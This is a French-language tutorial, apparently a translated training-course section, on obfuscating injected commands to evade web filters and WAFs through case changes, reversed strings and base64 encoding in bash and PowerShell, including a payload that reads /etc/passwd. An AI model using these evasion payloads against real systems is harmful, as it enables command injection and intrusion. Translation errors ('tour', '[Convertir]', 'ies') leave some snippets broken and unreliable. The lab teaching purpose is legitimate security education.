Obfuscation des commandes avancées
============================

* * * * *

Dans certains cas, nous pouvons avoir affaire à des solutions de filtrage avancées, telles que les pare-feu d'applications Web (WAF), et les techniques d'évasion de base peuvent ne pas nécessairement fonctionner. Nous pouvons utiliser des techniques plus avancées pour de telles occasions, ce qui rend la détection des commandes injectées beaucoup moins probable.

* * * * *

Manipulation de cas
-----------------

Une technique d'obscurcissement de commande que nous pouvons utiliser est la manipulation de la casse, comme l'inversion de la casse des caractères d'une commande (par exemple `WHOAMI`) ou l'alternance entre les cas (par exemple `WhOaMi`). Cela fonctionne généralement car une liste noire de commandes peut ne pas vérifier les différentes variations de casse d'un seul mot, car les systèmes Linux sont sensibles à la casse.

Si nous avons affaire à un serveur Windows, nous pouvons changer la casse des caractères de la commande et l'envoyer. Sous Windows, les commandes pour PowerShell et CMD sont insensibles à la casse, ce qui signifie qu'elles exécuteront la commande quelle que soit la casse dans laquelle elle est écrite :

```
PS C:\htb> WhOaMi

21a4j

```

Cependant, en ce qui concerne Linux et un shell bash, qui sont sensibles à la casse, comme mentionné précédemment, nous devons faire preuve d'un peu de créativité et trouver une commande qui transforme la commande en un mot entièrement en minuscules. Une commande de travail que nous pouvons utiliser est la suivante :

```
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21a4j

```

Comme nous pouvons le voir, la commande a fonctionné, même si le mot que nous avons fourni était (`WhOaMi`). Cette commande utilise `tr` pour remplacer tous les caractères majuscules par des caractères minuscules, ce qui donne une commande entièrement en minuscules. Cependant, si nous essayons d'utiliser la commande ci-dessus avec l'application Web `Host Checker` , nous verrons qu'elle est toujours bloquée :

#### Burp POST Demande

![Commandes de filtrage](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_3.jpg)

"Pouvez-vous deviner pourquoi ?" C'est parce que la commande ci-dessus contient des espaces, qui sont un caractère filtré dans notre application Web, comme nous l'avons vu précédemment. Ainsi, avec de telles techniques, "nous devons toujours nous assurer de ne pas utiliser de caractères filtrés", sinon nos requêtes échoueront et nous pourrions penser que les techniques n'ont pas fonctionné.

Une fois que nous avons remplacé les espaces par des tabulations (`%09`), nous voyons que la commande fonctionne parfaitement :

#### Burp POST Demande

![Commandes de filtrage](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_4.jpg)

Il existe de nombreuses autres commandes que nous pouvons utiliser dans le même but, comme les suivantes :

Code : bash

```
$(a="WhOaMi";printf %s "${a,,}")

```

Exercice : Pouvez-vous tester la commande ci-dessus pour voir si elle fonctionne sur votre machine virtuelle Linux, puis essayer d'éviter d'utiliser des caractères filtrés pour la faire fonctionner sur l'application Web ?

* * * * *

Commandes inversées
-----------------

Une autre technique d'obscurcissement des commandes dont nous parlerons consiste à inverser les commandes et à disposer d'un modèle de commande qui les rebascule et les exécute en temps réel. Dans ce cas, nous écrirons `imaohw` au lieu de `whoami` pour éviter de déclencher la commande sur liste noire.

Nous pouvons faire preuve de créativité avec de telles techniques et créer nos propres commandes Linux/Windows qui exécutent éventuellement la commande sans jamais contenir les mots de commande réels. Tout d'abord, nous devrons obtenir la chaîne inversée de notre commande dans notre terminal, comme suit :

Burp POST Demande

```
dsgsec@htb[/htb]$ echo 'whoami' | tour
imaohw

```

Ensuite, nous pouvons exécuter la commande d'origine en l'inversant dans un sous-shell (`$()`), comme suit :

Burp POST Demande

```
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21a4j

```

Nous constatons que même si la commande ne contient pas le mot `whoami` réel, elle fonctionne de la même manière et fournit le résultat attendu. On peut aussi tester cette commande avec notre exercice, et ça marche effectivement :

#### Burp POST Demande

![Commandes de filtrage](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_5.jpg)

Conseil : Si vous souhaitez contourner un filtre de caractères avec la méthode ci-dessus, vous devez également les inverser ou les inclure lors de l'inversion de la commande d'origine.

La même chose peut être appliquée dans `Windows` . Nous pouvons d'abord inverser une chaîne, comme suit :

Burp POST Demande

```
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw

```

Nous pouvons maintenant utiliser la commande ci-dessous pour exécuter une chaîne inversée avec un sous-shell PowerShell (`iex "$()"`), comme suit :

Burp POST Demande

```
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21a4j

```

* * * * *

Commandes codées
----------------

La dernière technique dont nous parlerons est utile pour les commandes contenant des caractères filtrés ou des caractères pouvant être décodés par URL par le serveur. Cela peut permettre à la commande d'être gâchée au moment où elle atteint le shell et finit par échouer à s'exécuter. Au lieu de copier une commande existante en ligne, nous essaierons cette fois de créer notre propre commande d'obfuscation unique. De cette façon, il est beaucoup moins susceptible d'être refusé par un filtre ou un WAF. La commande que nous créons sera unique à chaque cas, en fonction des caractères autorisés et du niveau de sécurité sur le serveur.

Nous pouvons utiliser divers outils d'encodage, lcomme `base64` (pour l'encodage b64) ou `xxd` (pour l'encodage hexadécimal). Prenons `base64` comme exemple. Tout d'abord, nous allons encoder la charge utile que nous voulons exécuter (qui inclut les caractères filtrés) :

Burp POST Demande

```
dsgsec@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

```

Nous pouvons maintenant créer une commande qui décodera la chaîne encodée dans un sous-shell (`$()`), puis la passera à `bash` pour qu'elle soit exécutée (c'est-à-dire `bash<<<`), comme suit :

Burp POST Demande

```
dsgsec@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

```

Comme nous pouvons le voir, la commande ci-dessus exécute parfaitement la commande. Nous n'avons inclus aucun caractère filtré et évité les caractères encodés susceptibles d'entraîner l'échec de l'exécution de la commande.

Conseil : Notez que nous utilisons `<<<` pour éviter d'utiliser un tube `|`, qui est un caractère filtré.

Nous pouvons maintenant utiliser cette commande (une fois que nous avons remplacé les espaces) pour exécuter la même commande via l'injection de commande :

#### Burp POST Demande

![Commandes de filtrage](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_6.jpg)

Même si certaines commandes étaient filtrées, comme `bash` ou `base64`, nous pourrions contourner ce filtre avec les techniques dont nous avons parlé dans la section précédente (par exemple, l'insertion de caractères), ou utiliser d'autres alternatives comme `sh` pour l'exécution de la commande et ` openssl` pour le décodage b64 ou `xxd` pour le décodage hexadécimal.

Nous utilisons également la même technique avec Windows. Tout d'abord, nous devons encoder notre chaîne en base64, comme suit :

Burp POST Demande

```
PS C:\htb> [Convertir] ::ToBase64String([System.Text.Encoding] ::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA

```

Nous pouvons également obtenir la même chose sous Linux, mais nous devrions convertir la chaîne `utf-8` en `utf-16` avant de la `base64` , comme suit :

Burp POST Demande

```
dsgsec@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA

```

Enfin, nous pouvons décoder la chaîne b64 et l'exécuter avec un sous-shell PowerShell (`ies "$()"`), comme suit :

Burp POST Demande

```
PS C:\htb> iex "$([System.Text.Encoding] ::Unicode.GetString([System.Convert] ::FromBase64String('dwBoAG8AYQBtAGkA')))"

21a4j

```

Comme nous pouvons le voir, nous pouvons faire preuve de créativité avec `Bash` ou `PowerShell` et créer de nouvelles méthodes de contournement et d'obscurcissement qui n'ont pas été utilisées auparavant, et sont donc très susceptibles de contourner les filtres et les WAF. Plusieurs outils peuvent nous aider à masquer automatiquement nos commandes, dont nous parlerons dans la section suivante.

En plus des techniques dont nous avons discuté, nous pouvons utiliser de nombreuses autres méthodes, telles que les caractères génériques, les expressions régulières, la redirection de sortie, l'expansion d'entiers et bien d'autres. Nous pouvons trouver de telles techniques sur [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).